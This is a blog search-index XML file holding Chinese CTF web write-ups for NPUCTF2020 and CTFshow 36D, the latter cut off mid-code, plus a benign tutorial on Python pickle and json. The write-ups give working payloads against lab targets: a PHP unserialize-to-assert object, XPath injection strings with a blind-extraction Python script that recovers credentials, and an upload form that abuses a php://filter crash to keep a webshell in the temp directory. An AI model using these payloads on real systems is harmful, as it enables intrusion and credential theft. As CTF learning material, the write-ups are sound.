<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NPUCTF2020web部分复现</title>
      <link href="/2020/07/12/NPUCTF2020_web/"/>
      <url>/2020/07/12/NPUCTF2020_web/</url>
      
        <content type="html"><![CDATA[<p>还有一个node和cbc字节翻转我这个菜鸡水平看不懂。。。。以后补上</p><a id="more"></a><h3 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h3><p>打开靶机源码处发现页面</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711153556.png" alt=""></p><p>打开页面得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure><p>两个对象创建和销毁时的魔术方法，将传入的data反序列化</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>由<code>__destruct</code>方法可知，会输出<code>$b($a)</code>，所以我们构造函数读取即可，用断言assert，<code>assert(phpinfo())</code>就是输出phpinfo()了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a = <span class="string">"phpinfo()"</span>;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">"assert"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"><span class="comment">//O:8:"HelloPhp":2:&#123;s:1:"a";s:9:"phpinfo()";s:1:"b";s:4:"eval";&#125;</span></span><br></pre></td></tr></table></figure><p>data传入即可</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711154817.png" alt=""></p><p>flag就在这里面</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711154914.png" alt=""></p><h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h3><p>首页是一个登录框，session存在期限</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711175219.png" alt=""></p><p>抓包重放，同样重放后session失效，应当是设置了csrf-token</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711180024.png" alt=""></p><h4 id="考点：xpath注入"><a href="#考点：xpath注入" class="headerlink" title="考点：xpath注入"></a>考点：xpath注入</h4><p>参考原文地址：<a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/" target="_blank" rel="noopener">Tr0y’s Blog</a></p><p>总结一下：</p><p>xpath 是一门在 XML 文档中查找信息的语言。xpath注入主要分为常规注入和布尔盲注</p><p>查询语句如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;&quot;.$name.&quot;&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]</span><br></pre></td></tr></table></figure><p>常规注入如下：</p><p>构造万能密码传入如<code>admin&#39; or &#39;1</code>：(已知admin用户)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;admin&#39; or &#39;1&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]</span><br></pre></td></tr></table></figure><p>或者<code>&#39; or 1 or &#39;1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;&#39; or 1 or &#39;1&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]</span><br></pre></td></tr></table></figure><p>或节点遍历<code>admin&#39;] | //* | //*[&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;admin&#39;] | &#x2F;&#x2F;* | &#x2F;&#x2F;*[&#39;&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]</span><br></pre></td></tr></table></figure><p>ps：xpath 没有注释一说，所以 payload 要自行构造闭合原语句。</p><p>布尔盲注payload用法主要如下：</p><table><thead><tr><th>payload</th><th align="center">含义</th></tr></thead><tbody><tr><td>‘ or count(/)=<strong>1-&gt;n</strong> or ‘1</td><td align="center">判断根节点数量（n即是根节点的数目）</td></tr><tr><td>‘ or string-length(name(/*[<strong>1-&gt;n</strong>]))=<strong>1-&gt;n</strong> or ‘1</td><td align="center">获取第n个节点的名字长度n</td></tr><tr><td>‘ or substring(name(/*[<strong>1-&gt;n</strong>]), 1, 1)=’<strong>测试字符</strong>‘ or ‘1</td><td align="center">逐位获取第n个节点名</td></tr></tbody></table><h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>使用<code>&#39; or substring(name(/*[1]), 1, 1)=&#39;a&#39; or &#39;1</code>猜测根节点字符</p><p>当<code>&#39; or substring(name(/*[1]), 1, 1)=&#39;a&#39; or &#39;1</code>时</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711192100.png" alt=""></p><p>当<code>&#39; or substring(name(/*[1]), 1, 1)=&#39;r&#39; or &#39;1</code>时</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711192120.png" alt=""></p><p>非法操作，则说明根节点的第一个字符是’r’</p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url =<span class="string">'http://e2f677a1-4672-4581-81d4-2e82706d0738.node3.buuoj.cn/login.php'</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">head =&#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/xml"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">find =re.compile(<span class="string">'&lt;input type="hidden" id="token" value="(.*?)" /&gt;'</span>)<span class="comment">#匹配页面token</span></span><br><span class="line"></span><br><span class="line">strs =<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span></span><br><span class="line"></span><br><span class="line">flag =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    print(<span class="string">'------------------'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        r = s.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        payload = <span class="string">"&lt;username&gt;' or substring(name(/*[1]),&#123;&#125;, 1)='&#123;&#125;' or '1&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line">        r = s.post(url=url,headers=head,data=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"非法操作"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711204336.png" alt=""></p><p>接下来依次跑根节点以下的子节点，直到跑到username和password，替换payload即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> #猜测子节点名称</span><br><span class="line"> payload_2 &#x3D; &quot;&lt;username&gt;&#39; or substring(name(&#x2F;root&#x2F;*[1]),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"> </span><br><span class="line"> #猜测accounts的节点</span><br><span class="line">payload_3 &#x3D;&quot;&lt;username&gt;&#39;or substring(name(&#x2F;root&#x2F;accounts&#x2F;*[1]),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"></span><br><span class="line">#猜测user节点</span><br><span class="line">payload_4 &#x3D;&quot;&lt;username&gt;&#39;or substring(name(&#x2F;root&#x2F;accounts&#x2F;user&#x2F;*[2]),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"></span><br><span class="line">#跑用户名和密码</span><br><span class="line">payload_username &#x3D;&quot;&lt;username&gt;&#39;or substring(&#x2F;root&#x2F;accounts&#x2F;user[2]&#x2F;username&#x2F;text(),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br><span class="line"></span><br><span class="line">payload_password &#x3D;&quot;&lt;username&gt;&#39;or substring(&#x2F;root&#x2F;accounts&#x2F;user[2]&#x2F;password&#x2F;text(),&#123;&#125;, 1)&#x3D;&#39;&#123;&#125;&#39; or &#39;1&lt;&#x2F;username&gt;&lt;password&gt;3123&lt;&#x2F;password&gt;&lt;token&gt;&#123;&#125;&lt;&#x2F;token&gt;&quot;.format(i,j,token[0])</span><br></pre></td></tr></table></figure><p>最后得到username=adm1n，password=cf7414b5bdb2e65ee43083f4ddbc4d9f，password解码md5得gtfly123</p><p>登录会闪过一句话，抓包截下来是一串base64<code>ZmxhZyBpcyBpbiAvZmxhZwo=</code>解码得flag is in /flag</p><p>url是<code>admin.php?file=welcome</code>，尝试php://filter读取，发现php和base被过滤，大小写绕过</p><p>得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711211139.png" alt=""></p><h3 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h3><p>打开靶机只有<code>username/password error</code>，源码处发现注释</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712095830.png" alt=""></p><p>随便传两个值抓包回放</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712104248.png" alt=""></p><h4 id="考点1：哈希长度拓展攻击"><a href="#考点1：哈希长度拓展攻击" class="headerlink" title="考点1：哈希长度拓展攻击"></a>考点1：哈希长度拓展攻击</h4><p>哈希长度拓展攻击是利用了 md5、sha1 等加密算法的缺陷，可以在不知道原始密钥的情况下来进行计算出一个对应的 hash 值。 </p><p>可以使用工具hashpump构造payload，用法如下</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712104552.png" alt=""></p><p>官方wp是说可以爆破secret的长度，但这题直接给出了Md5后的hash<code>973225ae4fc8977f86d1a330b0774630</code>，也就是pass。。。。</p><p>那么直接传，发现有跳转flflflflag.php</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712105001.png" alt=""></p><p>打开页面告诉不是flag并存在包含</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712105100.png" alt=""></p><p>可以利用伪协议读取源码</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712110818.png" alt=""></p><p>再扫一下目录</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712114201.png" alt=""></p><p>config.php还是告诉flag不在这里，dir.php列出了根目录下的文件</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712111401.png" alt=""></p><h4 id="考点2：临时文件包含（-php-7-Segment-Fault-）"><a href="#考点2：临时文件包含（-php-7-Segment-Fault-）" class="headerlink" title="考点2：临时文件包含（ php 7 Segment Fault ）"></a>考点2：临时文件包含（ php 7 Segment Fault ）</h4><p>php代码中使用php://filter的过滤器<code>strip_tags</code> , 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除</p><p>参考文章：<a href="https://www.anquanke.com/post/id/201136#h2-11" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201136#h2-11</a></p><p>构造上传表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://22a3b9e5-eb32-4c8e-b130-54e4a5beb8df.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"filename"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传一句话文件</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712111918.png" alt=""></p><p>查看dir.php，我这试了两次</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712114122.png" alt=""></p><p>查看文件是否包含成功</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712113629.png" alt=""></p><p>包含文件连接shell查看即可，flag就在phpinfo里</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712132804.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypass </tag>
            
            <tag> serialize </tag>
            
            <tag> xpath </tag>
            
            <tag> hashpump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python序列化和反序列化</title>
      <link href="/2020/07/10/python_serialize/"/>
      <url>/2020/07/10/python_serialize/</url>
      
        <content type="html"><![CDATA[<p>python的序列化和反序列化问题主要涉及两个模块：pickle，json</p><a id="more"></a><h3 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h3><p>翻阅手册</p><blockquote><p>模块 pickle实现了对一个 Python 对象结构的二进制序列化和反序列化。 “pickling” 是将 Python 对象及其所拥有的层次结构转化为一个字节流的过程，而 “unpickling” 是相反的操作，会将（来自一个 binary file 或者 bytes-like object的）字节流转化回一个对象层次结构。 pickling（和 unpickling）也被称为“序列化”, “编组” 或者 “平面化”。而为了避免混乱，此处采用术语 “封存 (pickling)” 和 “解封 (unpickling)”。</p></blockquote><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li>pickle所使用的数据格式仅可用于 Python</li><li>pickle格式使用二进制存储</li><li>存储之后人类不可读</li><li>存在风险</li></ul><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><h5 id="pickle-dump"><a href="#pickle-dump" class="headerlink" title="pickle.dump"></a>pickle.dump</h5><p>将对象序列化（即封存）并写入已打开的文件中。</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'test.txt'</span>,<span class="string">'wb'</span>)  </span><br><span class="line">data = &#123;<span class="string">'e1'</span>:<span class="string">'python'</span>,<span class="string">'e2'</span>:<span class="string">'serialize'</span>,<span class="string">'e3'</span>:<span class="string">'is'</span>,<span class="string">'e4'</span>:<span class="string">'good'</span>&#125;</span><br><span class="line">pickle.dump(data,f)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710134953.png" alt=""></p><h5 id="pickle-dumps"><a href="#pickle-dumps" class="headerlink" title="pickle.dumps"></a>pickle.dumps</h5><p>将对象序列化</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">data = &#123;<span class="string">'e1'</span>:<span class="string">'python'</span>,<span class="string">'e2'</span>:<span class="string">'serialize'</span>,<span class="string">'e3'</span>:<span class="string">'is'</span>,<span class="string">'e4'</span>:<span class="string">'good'</span>&#125;</span><br><span class="line">result = pickle.dumps(data)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710135217.png" alt=""></p><h5 id="pickle-load"><a href="#pickle-load" class="headerlink" title="pickle.load"></a>pickle.load</h5><p>从文件中读取序列化字符串并反序列化</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'test.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">result = pickle.load(f)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710135647.png" alt=""></p><h5 id="pickle-loads"><a href="#pickle-loads" class="headerlink" title="pickle.loads"></a>pickle.loads</h5><p>将序列化字符串反序列化</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">data = &#123;<span class="string">'e1'</span>:<span class="string">'python'</span>,<span class="string">'e2'</span>:<span class="string">'serialize'</span>,<span class="string">'e3'</span>:<span class="string">'is'</span>,<span class="string">'e4'</span>:<span class="string">'good'</span>&#125;</span><br><span class="line">result = pickle.dumps(data)</span><br><span class="line">print(result)</span><br><span class="line">reverse = pickle.loads(result)</span><br><span class="line">print(reverse)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710135849.png" alt=""></p><h3 id="Json"><a href="#Json" class="headerlink" title="Json"></a>Json</h3><blockquote><p>JSON (JavaScript Object Notation)，是一个受 JavaScript 的对象字面量语法启发的轻量级数据交换格式，尽管它不仅仅是一个严格意义上的 JavaScript 的字集 。</p></blockquote><p>JSON序列化：将Python内置的数据类型序列化为JSON格式，用来数据存储或数据交换。</p><h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><ul><li>人类可读</li><li>采用文本序列化格式，输出 unicode 文本</li><li>可互操作，在Python系统之外广泛使用</li><li>相比pickle较为安全</li></ul><h4 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h4><p>方法名和pickle相同，但主要是类型的转换</p><h5 id="json-dumps"><a href="#json-dumps" class="headerlink" title="json.dumps"></a>json.dumps</h5><p>将dict类型的数据转成str</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json  </span><br><span class="line">  </span><br><span class="line">data = &#123;<span class="string">'name'</span>:<span class="string">'python'</span>,<span class="string">'sex'</span>:<span class="string">'boy'</span>,<span class="string">'age'</span>:<span class="number">18</span>&#125;  </span><br><span class="line">      </span><br><span class="line">result = json.dumps(data)   </span><br><span class="line"></span><br><span class="line">print(type(data))</span><br><span class="line">print(result)</span><br><span class="line">print(type(result))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710150440.png" alt=""></p><h5 id="json-dump"><a href="#json-dump" class="headerlink" title="json.dump"></a>json.dump</h5><p>将dict类型的数据转换类型，并写入到json文件中</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json  </span><br><span class="line">  </span><br><span class="line">data = &#123;<span class="string">'name'</span>:<span class="string">'python'</span>,<span class="string">'sex'</span>:<span class="string">'boy'</span>,<span class="string">'age'</span>:<span class="number">18</span>&#125;  </span><br><span class="line">      </span><br><span class="line">filetest = (<span class="string">'test.txt'</span>)  </span><br><span class="line"></span><br><span class="line">result = json.dumps(data)   </span><br><span class="line"><span class="keyword">with</span> open(filetest, <span class="string">"w"</span>) <span class="keyword">as</span> f:  </span><br><span class="line">  f.write(result)  </span><br><span class="line">  f.close()  </span><br><span class="line">  </span><br><span class="line">json.dump(data, open(filetest, <span class="string">"w"</span>))</span><br></pre></td></tr></table></figure><p>写入前需先dumps转换成类型，直接存入会报错</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710150639.png" alt=""></p><h5 id="json-loads"><a href="#json-loads" class="headerlink" title="json.loads"></a>json.loads</h5><p>将str类型的数据转成dict</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json  </span><br><span class="line">  </span><br><span class="line">data = &#123;<span class="string">'name'</span>:<span class="string">'python'</span>,<span class="string">'sex'</span>:<span class="string">'boy'</span>,<span class="string">'age'</span>:<span class="number">18</span>&#125;  </span><br><span class="line">      </span><br><span class="line">result = json.dumps(data) </span><br><span class="line">reverse = json.loads(result)  </span><br><span class="line"></span><br><span class="line">print(type(data))</span><br><span class="line">print(result)</span><br><span class="line">print(type(result))</span><br><span class="line">print(reverse)</span><br><span class="line">print(type(reverse))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710151244.png" alt=""></p><h5 id="json-load"><a href="#json-load" class="headerlink" title="json.load"></a>json.load</h5><p>从文件中读取数据，将str类型的数据转成dict</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json  </span><br><span class="line"> </span><br><span class="line">filetest = (<span class="string">'test.txt'</span>)  </span><br><span class="line"> </span><br><span class="line">result = json.load(open(filetest))   </span><br><span class="line"> </span><br><span class="line">print(result) </span><br><span class="line">print(type(result))</span><br></pre></td></tr></table></figure><p><img src="C:/Users/15363/AppData/Roaming/Typora/typora-user-images/image-20200710151612475.png" alt="image-20200710151612475"></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> serialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow36D杯web复现</title>
      <link href="/2020/07/08/CTFshow_36D_wp/"/>
      <url>/2020/07/08/CTFshow_36D_wp/</url>
      
        <content type="html"><![CDATA[<p>好早的比赛了。</p><a id="more"></a><h3 id="你取吧"><a href="#你取吧" class="headerlink" title="你取吧"></a>你取吧</h3><p>打开靶机直接给出源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$hint=file_get_contents(<span class="string">'php://filter/read=convert.base64-encode/resource=hhh.php'</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span 